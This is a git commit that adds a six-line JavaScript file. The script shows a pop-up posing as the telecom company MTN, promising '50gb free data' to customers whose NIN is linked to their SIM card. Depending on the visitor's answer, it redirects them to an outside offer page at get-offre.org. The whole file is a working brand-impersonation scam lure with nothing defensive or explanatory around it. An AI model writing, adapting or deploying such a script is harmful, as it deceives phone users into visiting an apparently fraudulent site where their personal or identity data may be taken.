20912ef1ea802e094aa3afa11111b21430ce9301
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-06-19 16:46:05 -0700

    Create nin-activation.js

---
+++ nin-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('MTN: Dear customer, Kindly activate your 50gb free data if your NIN is linked to your sim card, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://get-offre.org/nin-50gb.html';
+}
